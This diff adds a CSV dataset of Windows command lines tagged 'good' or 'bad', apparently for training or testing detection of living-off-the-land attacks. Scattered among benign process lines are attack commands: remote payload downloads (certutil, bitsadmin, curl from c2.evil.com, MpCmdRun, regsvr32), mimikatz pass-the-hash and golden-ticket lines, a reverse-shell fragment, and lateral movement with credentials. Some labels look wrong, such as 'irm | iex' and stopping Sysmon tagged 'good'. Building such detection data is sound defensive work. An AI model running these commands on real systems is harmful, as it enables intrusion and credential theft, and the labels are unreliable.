@@ -1,0 +1,213 @@
+commands,tag
+cmd.exe /c tasklist,good
+"""C:\Program Files (x86)\Microsoft Visual Studio\Installer\VSInstallerElevationService.exe""",good
+certutil -viewstore -gmt My,good
+C:\Windows\System32\npm.exe -v,good
+--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED ``,good
+python version,good
+"powershell (New-Object System.Net.WebClient).DownloadFile(""http://193.168.119.155/PowerUp.ps1""",bad
+powershell Get-DomainComputer -TrustedToAuth | select name,bad
+C:\Users\Acer\.gemini\bin\agy.exe --hub --hub-port=55760 --app_data_dir=antigravity --csrf_token=2ac57a61-1326-4bd2-9df5-d8588a7778d4 --add-dir=d:\LOTL,good
+sc qc Winmgmt,good
+"wmic /node:LABWIN10.lab.local /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\LAB2012DC01.LAB.local\C$\Windows\Temp\build.xml""",bad
+"python -u ""C:\Users\Acer\AppData\Local\Temp\tempCodeRunnerFile.python"" ""D:\CTF\Sherlocks\CAMouflage\2025-06-21T205150_output\C\Users\Administrator\AppData\Local\Temp\Mysql.wp5""",good
+C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s LanmanServer,good
+.\Sysmon64.exe -m`,good
+expand c:\\ADS\\file1.bat c:\\ADS\\file2.bat,bad
+Set-MpPreference -DisableRealtimeMonitoring $false`,good
+# Ghi đè lại nội dung vào file README.md`,good
+route print 0.0.0.0,good
+code.exe --list-extensions,good
+code C:\Workspaces\Project,good
+C:\WINDOWS\Explorer.EXE,good
+C:\WINDOWS\system32\sppsvc.exe,good
+"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26090.9-0\NisSrv.exe""",good
+"Write-Host ""[SKIP] $($file.FullName)"" -ForegroundColor Yellow`",good
+Get-AppxPackage-NameMicrosoft.LanguageExperiencePack*|Remove-AppxPackge,good
+"powershell.exe Get-Service | Where-Object {$_.Status -eq ""Running""}",good
+C:\Program Files\WindowsApps\Microsoft.YourPhone_1.24112.110.0_x64__8wekyb3d8bbwe\PhoneExperienceHost.exe -ComServer:Background -Embedding,good
+C:\WINDOWS\System32\drivers\RivetNetworks\Killer\KAPSService.exe,good
+%SystemRoot%\System32\wsqmcons.exe,good
+C:\Windows\System32\npm.exe test,good
+--add-opens=java.base/java.lang=ALL-UNNAMED ``,good
+ModuleCoreService.exe /startSystemModeHosting=0_1_TIME_TO_DIE /sessionId=0 /groupId=1,good
+chcp 65001,good
+te.exe bypass.wsc,bad
+dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart,good
+"""C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe""",good
+regsvr32 /s /n /u /i:http://11.12.13.14/file.sct scrobj.dll,bad
+cd .\dowload\,good
+powershell Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess,bad
+gpresult /h C:\temp\gpreport.html,good
+Get-NetConnectionProfile,good
+npm install --save-dev typescript @types/node,good
+cmd.exe /c dotnet.exe --list-sdks,good
+MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\beacon.exe,bad
+ie4uinit.exe -BaseSettings,bad
+"powershell -ExecutionPolicy Bypass -File ""D:\Github\organize_images.ps1"" -RootDir ""D:\Github\Labs\Giao thức an toàn mạng""",good
+route add 192.168.10.0 mask 255.255.255.0 192.168.1.1,good
+C:\WINDOWS\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s NgcCtnrSvc,good
+C:\WINDOWS\SysWOW64\vmnetdhcp.exe,good
+"cd ""d:\dowload\oop\lab5\"" ; if ($?) { javac Main.java } ; if ($?) { java main }",good
+"cd ""d:\dowload\oop\lab7\câu1\"" ; if ($?) { javac KhuPho.java } ; if ($?) { java KhuPho }",good
+git --version`,good
+C:\WINDOWS\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.22621.4740_none_e928b4ac42f6002b\TiWorker.exe -Embedding,good
+explorer.exe /root,bad
+telnet 10.10.10.10 80,bad
+"""C:\Users\Acer\AppData\Local\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --no-pre-read-main-dll --video-capture-use-gpu-memory-buffer --lang=vi --device-scale-factor=1 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=100 --launch-time-ticks=68208692847 --metrics-shmem-handle=8328,i,16185439602403939702,105960511162336887,1572864 --field-trial-handle=1816,i,1909929813794245089,1549556728922461944,262144 --variations-seed-version=main@165f9af4641d70dfbbd067d3cc4757ba4676e943 --pseudonymization-salt-handle=1936,i,1207052611745020365,11882864144233469617,4 --trace-process-track-uuid=3190709080016056394 --mojo-platform-channel-handle=9280 /prefetch:1",good
+C:\Program Files\Mozilla Firefox\firefox.exe -contentproc -isForBrowser -prefsHandle 6668 -prefsLen 37393 -prefMapHandle 2820 -prefMapSize 268440 -jsInitHandle 2308 -jsInitLen 254356 -parentBuildID 20250120135430 -ipcHandle 1104 -initialChannelId {8fe5d5f3-eff2-4c84-b48b-bd2c335209a2} -parentPid 20280 -crashReporter \\.\pipe\gecko-crash-server-pipe.20280 -win32kLockedDown -appDir C:\Program Files\Mozilla Firefox\browser - 10 tab,good
+"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe""} -r:http://target:5985",bad
+C:\WINDOWS\system32\services.exe,good
+& C:/Users/Acer/AppData/Local/Microsoft/WindowsApps/python3.11.exe d:/FirtProjectPython/hello_world.py,good
+netstat -e -s,good
+ping 127.0.0.1 -n 4,good
+Rename-Item ``,good
+ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://10.10.10.10/xxxxxxxxx?encodedfile,bad
+cmd.exe /c pathping -n 8.8.4.4,good
+C:\WINDOWS\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\\AS\\IAS\\IntelAudioService.exe,good
+getmac /v /fo csv,good
+rasautou -d powershell.dll -p powershell -a a -e e,bad
+cmd.exe /c net statistics server,good
+"%windir%\system32\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange",good
+cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf,bad
+taskhostw.exe /RuntimeWide,good
+"$(@%SystemRoot%\system32\Autopilot.dll,-600)",good
+C:\WINDOWS\system32\vssvc.exe,good
+kubectl logs -f deployment/api-gateway,good
+diantz.exe \\\\11.121.12.13\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,bad
+manage-bde -status C:,good
+C:\Users\LENOVO\AppData\Local\Programs\Microsoft VS Code\Code.exe,good
+copy C:\Windows\Temp\Malice.exe \\10.10.10.10\C$\Windows\Temp,bad
+C:\Windows\SysWOW64\Rundll32.exe {64F97CDC...FAB40CA\}.db #1 #1},bad
+"$(@%SystemRoot%\system32\Autopilot.dll,-602)",good
+notepad.exe C:\Windows\System32\drivers\etc\hosts,good
+Update.exe --download [http://10.10.10.1],bad
+cmd.exe /c gpresult /r,good
+C:\WINDOWS\system32\svchost.exe -k WbioSvcGroup,good
+"""C:\Users\Acer\AppData\Local\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=utility --utility-sub-type=audio.mojom.AudioService --lang=vi --service-sandbox-type=audio --video-capture-use-gpu-memory-buffer --no-pre-read-main-dll --metrics-shmem-handle=5988,i,9685035284970567098,668791626754739419,524288 --field-trial-handle=1816,i,1909929813794245089,1549556728922461944,262144 --variations-seed-version=main@165f9af4641d70dfbbd067d3cc4757ba4676e943 --pseudonymization-salt-handle=1936,i,1207052611745020365,11882864144233469617,4 --trace-process-track-uuid=3190709012549043266 --mojo-platform-channel-handle=5300 /prefetch:12",good
+C:\WINDOWS\system32\svchost.exe -k imgsvc,good
+C:\WINDOWS\system32\svchost.exe -k rpcss -p,good
+C:\WINDOWS\System32\svchost.exe -k LocalServiceNetworkRestricted -s RmSvc,good
+"C:\Users\LENOVO\AppData\Local\Programs\Python\Python313\python.exe -c from multiprocessing.spawn import spawn_main; spawn_main(parent_pid=23196, pipe_handle=324) --multiprocessing-fork",good
+%windir%\system32\devicecensus.exe UserCxt,good
+vssadmin list shadows,bad
+C:\Program Files\Microsoft Office\root\Office16\sdxhelper.exe /onlogon,good
+lines = [l.strip() for l in res.splitlines() if len(l.strip()) > 5],good
+"""C:\Program Files (x86)\UltraViewer\UltraViewer_Service.exe""",good
+C:\WINDOWS\system32\srtasks.exe ExecuteScopeRestorePoint /WaitForRestorePoint:3,good
+-javaagent:burploader.jar -noverify -jar burpsuite_pro.jar`,good
+C:\WINDOWS\uus\AMD64\MoNotificationUx.exe /NotificationType Scan_Seeker_Available /FormFactor Passive /Branding Os /CV FDPYrDzt0EmI5Uhv.1.0.0,good
+git tag -l -n 20,good
+set comspec=c:\\windows\\system32\\calc.exe & cscript c:\\windows\\system32\\manage-bde.wsf,bad
+python -m venv venv,good
+powershell Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>,bad
+"powershell.exe Get-Process -Name chrome,msedge,code,explorer",good
+C:\WINDOWS\system32\svchost.exe -k P9RdrService -p,good
+cmd.exe /c whoami /all,good
+"""C:\Users\Acer\AppData\Local\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --extension-process --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --no-pre-read-main-dll --video-capture-use-gpu-memory-buffer --lang=vi --device-scale-factor=1 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=53 --launch-time-ticks=66112694874 --metrics-shmem-handle=7036,i,3063898547019116198,7536293691275301944,1572864 --field-trial-handle=1816,i,1909929813794245089,1549556728922461944,262144 --variations-seed-version=main@165f9af4641d70dfbbd067d3cc4757ba4676e943 --pseudonymization-salt-handle=1936,i,1207052611745020365,11882864144233469617,4 --trace-process-track-uuid=3190709035975089491 --mojo-platform-channel-handle=8568 /prefetch:9",good
+pip freeze > requirements.txt,good
+C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_524.34401.20.0_x64__cw5n1h2txyewy\Dashboard\Widgets.exe -ServerName:Microsoft.Windows.DashboardServer,good
+expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.txt:file.bat,bad
+findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe,bad
+Set-ExecutionPolicy RemoteSigned`,good
+ModuleCoreService.exe /startUserModeHosting=2_1_TIME_TO_DIE /sessionId=2 /groupId=1,good
+"C:\Windows\System32\tasklist /fi ""STATUS eq RUNNING""",good
+netstat -ano,good
+C:\Windows\System32\driverquery /fo csv,good
+net pause lanmanworkstation,good
+irm https://b.hypnguyen.com | iex`,good
+cmd.exe /c net accounts,good
+rundll32 syssetup.dll,bad
+"Powerpnt.exe ""http://193.168.1.10/TeamsAddinLoader.dll""",bad
+"C:\ProgramData\OEM\UpgradeTool\ListCheck.exe"" """,good
+ssh -p 53129 ctf-player@atlas.picoctf.net,good
+C:\Program Files\Mozilla Firefox\firefox.exe -contentproc -parentBuildID 20250120135430 -sandboxingKind 0 -prefsHandle 6160 -prefsLen 40286 -prefMapHandle 6168 -prefMapSize 268392 -ipcHandle 5940 -initialChannelId {f26bedbd-6b73-4777-98cd-8b3d4f80a057} -parentPid 13760 -crashReporter \\.\pipe\gecko-crash-server-pipe.13760 -win32kLockedDown -appDir C:\Program Files\Mozilla Firefox\browser - 6 utility,good
+wevtutil el,good
+certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,bad
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=service --string-annotations --always-read-main-dll --field-trial-handle=2832,i,2061555011232612229,6147179023448215311,262144 --variations-seed-version --mojo-platform-channel-handle=2844 /prefetch:13",good
+C:\WINDOWS\system32\svchost.exe -k appmodelRedirectionGuard -p,good
+C:\WINDOWS\system32\svchost.exe -k localService -p,good
+curl.exe -s http://c2.evil.com/shell.exe -O,bad
+"+ Stop-Service -Name ""Sysmon*"" -Force`",good
+bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10/10mb.zip c:\10mb.zip,bad
+"powershell.exe -Command ""Get-Process | Sort-Object CPU -Descending | Select-Object -First 10""",good
+"""C:\Program Files\Tailscale\tailscaled.exe""",good
+"powershell Get-DomainGroupMember ""Domain Admins"" | select -ExpandProperty membername",bad
+cmd.exe /c route print 192.*,good
+wsl --unregister kali-linux,good
+"""C:\Users\Acer\AppData\Local\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --extension-process --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --no-pre-read-main-dll --video-capture-use-gpu-memory-buffer --lang=vi --device-scale-factor=1 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=407 --launch-time-ticks=92717076451 --metrics-shmem-handle=8700,i,18295223290448982337,17596314990081670695,1572864 --field-trial-handle=1816,i,1909929813794245089,1549556728922461944,262144 --variations-seed-version=main@165f9af4641d70dfbbd067d3cc4757ba4676e943 --pseudonymization-salt-handle=1936,i,1207052611745020365,11882864144233469617,4 --trace-process-track-uuid=3190709367687904037 --mojo-platform-channel-handle=8988 /prefetch:9",good
+C:\WINDOWS\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TextInputManagementService,good
+"Get-ChildItem -Path . -Filter ""README.md"" -Recurse | ForEach-Object {`",good
+pathping -n 8.8.4.4,good
+C:\Program Files\Mozilla Firefox\firefox.exe -contentproc -parentBuildID 20250120135430 -prefsHandle 2448 -prefsLen 33072 -prefMapHandle 2452 -prefMapSize 268440 -ipcHandle 2460 -initialChannelId {5b6da235-9656-4e73-b078-45588065fbce} -parentPid 20280 -crashReporter \\.\pipe\gecko-crash-server-pipe.20280 -win32kLockedDown -appDir C:\Program Files\Mozilla Firefox\browser - 2 socket,good
+C:\Program Files\Microsoft Office\root\Office16\sdxhelper.exe,good
+"& C:/Users/Acer/AppData/Local/Microsoft/WindowsApps/python3.11.exe ""d:/scipt 18 lab sqli/lab 9.py""",good
+start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw,bad
+C:\Windows\System32\whoami /user,good
+"C:\Windows\System32\wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors",good
+powershell Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname,bad
+%windir%\system32\sc.exe start w32time task_started,good
+desktopimgdownldr /lockscreenurl:https://11.11.11.11.com:8080/file.ext /eventName:randomname,bad
+"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\132.0.2957.127\msedgewebview2.exe --type=gpu-process --string-annotations --noerrdialogs --user-data-dir=C:\Users\LENOVO\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView --webview-exe-name=Widgets.exe --webview-exe-version=524.34401.20.0 --embedded-browser-webview=1 --gpu-preferences=UAAAAAAAAADgAAAEAAAAAAAAAAAAAAAAAABgAAEAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA --always-read-main-dll --field-trial-handle=1800,i,6251010059792591232,1210524644140066450,262144 --variations-seed-version --mojo-platform-channel-handle=1788 /prefetch:2 /pfhostedapp:9012b5dd5b35b16d0837a1a6aca980719d7aa20d",good
+"C:\Users\Acer\AppData\Local\BraveSoftware\Update\BraveUpdate.exe"" /ua /installsource scheduler""",good
+getmac /v,good
+"""C:\Program Files (x86)\Common Files\Microsoft Shared\Source Engine\OSE.EXE""",good
+mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>,bad
+conhost.exe --headless cmd.exe /c start evil.exe,bad
+"Get-FileHash ""D:\dowload\Sherlook HTB\noxious.zip"" -Algorithm SHA1",good
+C:\WINDOWS\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc,good
+C:\Windows\System32\netstat -p tcp,good
+runscripthelper.exe surfacecheck \\\\?\\C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt C:\\Test,bad
+C:\Windows\System32\ping 192.168.1.1 -n 4,good
+C:\WINDOWS\System32\svchost.exe -k NetSvcs -p,good
+"""C:\Program Files (x86)\Google\GoogleUpdater\157.0.8089.0\updater.exe"" --system --windows-service --service=update-internal",good
+%windir%\system32\cleanmgr.exe /autocleanstoragesense /d %systemdrive%,good
+# Lấy tên file cuối cùng`,good
+C:\Program Files\Mozilla Firefox\firefox.exe -contentproc -isForBrowser -prefsHandle 6504 -prefsLen 37445 -prefMapHandle 6720 -prefMapSize 268440 -jsInitHandle 7536 -jsInitLen 254356 -parentBuildID 20250120135430 -ipcHandle 5832 -initialChannelId {d8dbef8c-24a5-439d-96f6-96987b8eb121} -parentPid 20280 -crashReporter \\.\pipe\gecko-crash-server-pipe.20280 -win32kLockedDown -appDir C:\Program Files\Mozilla Firefox\browser - 14 tab,good
+C:\Windows\System32\tasklist /svc,good
+C:\Windows\System32\hostname,good
+"& C:/Users/Acer/AppData/Local/Microsoft/WindowsApps/python3.11.exe ""d:/scipt 18 lab sqli/lab 5.py""",good
+"""C:\WINDOWS\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",good
+wmic shadowcopy call create Volume='C:\',bad
+"C:\Windows\System32\wmic diskdrive get model,size,status",good
+WinHttp.WinHttpRequest.5.1;$h.open('POST',bad
+"""C:\Program Files\WSL\wslservice.exe""",good
+"ruby -rsocket -e 'c=TCPSocket.new(""11.0.0.1""",bad
+docker system prune -f,good
+expand \\\\10.10.10.10\\folder\\file.bat c:\\ADS\\file.txt:file.bat,bad
+-LiteralPath $file.FullName ``,good
+C:\Windows\System32\nslookup -type=mx google.com,good
+C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s UsoSvc,good
+"& C:/Users/Acer/AppData/Local/Microsoft/WindowsApps/python3.11.exe ""d:/scipt 18 lab sqli/lab 16.py""",good
+expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.bat,bad
+"if ($file.Name -eq ""README.md"") {`",good
+"cd ""d:\dowload\oop\baiThuchanh7\"" ; if ($?) { javac Gambler.java } ; if ($?) { java Gambler }",good
+verclsid.exe /S /C {CLSID},bad
+kerberos::golden /domain:10.10.10.10 /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi,bad
+C:\WINDOWS\system32\svchost.exe -k DevicesFlow,good
+dotnet.exe [PATH_TO_DLL],bad
+C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe,good
+telnet 11.11.11.11 80,bad
+C:\Windows\System32\netstat -ano,good
+C:\WINDOWS\system32\svchost.exe -k NetworkServiceNetworkRestricted -p -s PolicyAgent,good
+"""C:\Users\Acer\AppData\Local\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=vi --service-sandbox-type=none --no-pre-read-main-dll --start-stack-profiler --metrics-shmem-handle=2176,i,5852507304122500979,18402533175870883018,524288 --field-trial-handle=1816,i,1909929813794245089,1549556728922461944,262144 --variations-seed-version=main@165f9af4641d70dfbbd067d3cc4757ba4676e943 --pseudonymization-salt-handle=1936,i,1207052611745020365,11882864144233469617,4 --trace-process-track-uuid=3190708989122997041 --mojo-platform-channel-handle=2184 /prefetch:11",good
+c:\Users\LENOVO\.vscode\extensions\ms-python.python-2024.22.2-win32-x64\python-env-tools\bin\pet.exe server,good
+"xcopy ""C:\Source\*.*"" ""D:\Destination\"" /s /e /h /y",good
+psexec \\10.10.10.10 -u Domain\User -p Password ipconfig,bad
+C:\WINDOWS\System32\SearchFilterHost.exe 656 3068 2840 888 {7FC3863B-7471-4B10-84E3-A5C2E0330618},good
+Mftrace.exe cmd.exe,bad
+C:\WINDOWS\system32\svchost.exe -k DevicesFlow -s DevicesFlowUserSvc,good
+git pull,good
+C:\WINDOWS\system32\svchost.exe -k wsappx -p -s AppXSvc,good
+cmd.exe /c chcp 437,good
+"C:\Program Files\Acer\StorPSCTL\StorPSCTL.exe"" """,good
+"""C:\WINDOWS\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\CrossDeviceResume.exe"" /tileid MicrosoftWindows.Client.CBS_cw5n1h2txyewy!CrossDeviceResumeApp",good
+C:\WINDOWS\System32\svchost.exe -k rdxgroup,good
+Set-Content ``,good
+powershell powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1,bad
+"$pattern,`",good
+"-H ^""Connection: keep-alive^"" ^",good
+arp -d *,good
+C:\WINDOWS\system32\AUDIODG.EXE 0x0000000000000518,good
+makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab,bad
+sc query state= all,good
